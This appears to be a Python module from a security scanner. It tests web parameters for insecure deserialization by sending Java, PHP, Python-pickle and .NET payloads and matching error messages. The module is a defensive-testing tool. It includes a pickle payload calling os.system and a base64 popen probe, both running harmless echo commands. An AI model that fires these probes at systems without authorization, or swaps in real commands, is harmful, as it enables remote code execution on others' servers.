"""反序列化漏洞检测器"""
import base64
import urllib.parse
from typing import List
from secops_core.http_client import http_get, http_post
from secops_core.config import ATTACK_DELAY
from secops_offense.attack_engine.finding import Finding
from secops_offense.attack_engine.auth import log_audit
from secops_offense.attack_engine.modules.base import BaseDetector
import time


class DeserializationDetector(BaseDetector):
    name = "deserialization"
    category = "Deserialization"

    JAVA_PAYLOADS = [
        base64.b64encode(b"\xac\xed\x00\x05").decode(),
    ]

    PHP_PAYLOADS = [
        "O:8:\"stdClass\":0:{}",
        'O:40:"Phar\\Phar":4:{s:8:"_stub";s:12:"test.txt";}',
    ]

    PYTHON_PAYLOADS = [
        base64.b64encode(b"cos\nsystem\n(S'test123456789'\ntR.").decode(),
        base64.b64encode(b"__import__('os').popen('echo secops').read()").decode(),
    ]

    NET_PAYLOADS = [
        "AAEAAAD/////AQAAAAAAAAAMAgAAAFFTeXN0ZW0sIFZlcnNpb249NC4w",
    ]

    ERROR_SIGNS = [
        "deserializ", "invalid stream header", "ClassNotFoundException",
        "InvalidClassName", "ObjectInputStream", "readObject",
        "__wakeup", "unserialize", "__unserialize",
        "pickle", "yaml.load", "marshal.loads",
    ]

    def test(self, target_url: str, params: list = None, **kwargs) -> List[Finding]:
        findings = []

        if params is None:
            parsed = urllib.parse.urlparse(target_url)
            if parsed.query:
                params = list(urllib.parse.parse_qs(parsed.query).keys())
            else:
                params = ["data", "payload", "token", "session", "state",
                          "config", "params", "object", "serialized"]

        parsed = urllib.parse.urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        all_payloads = (
            [("java", p) for p in self.JAVA_PAYLOADS] +
            [("php", p) for p in self.PHP_PAYLOADS] +
            [("python", p) for p in self.PYTHON_PAYLOADS] +
            [("net", p) for p in self.NET_PAYLOADS]
        )

        for param in params:
            for lang, payload in all_payloads:
                test_url = f"{base_url}?{urllib.parse.urlencode({param: payload})}"
                log_audit("DESER_TEST", test_url, f"param={param}, lang={lang}")

                status, headers, body = http_get(test_url)

                if status == 0:
                    time.sleep(ATTACK_DELAY)
                    continue

                body_lower = body.lower()
                if any(sig.lower() in body_lower for sig in self.ERROR_SIGNS):
                    findings.append(Finding(
                        vuln_type="Deserialization", severity="critical",
                        title=f"反序列化漏洞 ({lang.upper()}) - 参数 {param}",
                        location=test_url, payload=payload[:100],
                        evidence=f"反序列化错误信息: {[s for s in self.ERROR_SIGNS if s.lower() in body_lower][:2]}",
                        description=f"参数 {param} 接受 {lang} 反序列化数据，可能导致远程代码执行。",
                        remediation="禁止接受用户提供的序列化数据，使用 JSON 等安全格式"
                    ))
                    break

                test_post_url = base_url
                log_audit("DESER_TEST_POST", test_post_url, f"param={param}, lang={lang}")
                status, headers, body = http_post(
                    test_post_url,
                    urllib.parse.urlencode({param: payload})
                )

                if status == 0:
                    time.sleep(ATTACK_DELAY)
                    continue

                body_lower = body.lower()
                if any(sig.lower() in body_lower for sig in self.ERROR_SIGNS):
                    findings.append(Finding(
                        vuln_type="Deserialization", severity="critical",
                        title=f"反序列化漏洞 POST ({lang.upper()}) - 参数 {param}",
                        location=test_post_url, payload=payload[:100],
                        evidence=f"反序列化错误信息: {[s for s in self.ERROR_SIGNS if s.lower() in body_lower][:2]}",
                        description=f"POST 参数 {param} 接受 {lang} 反序列化数据。",
                        remediation="禁止接受用户提供的序列化数据"
                    ))
                    break

                time.sleep(ATTACK_DELAY)

        return findings
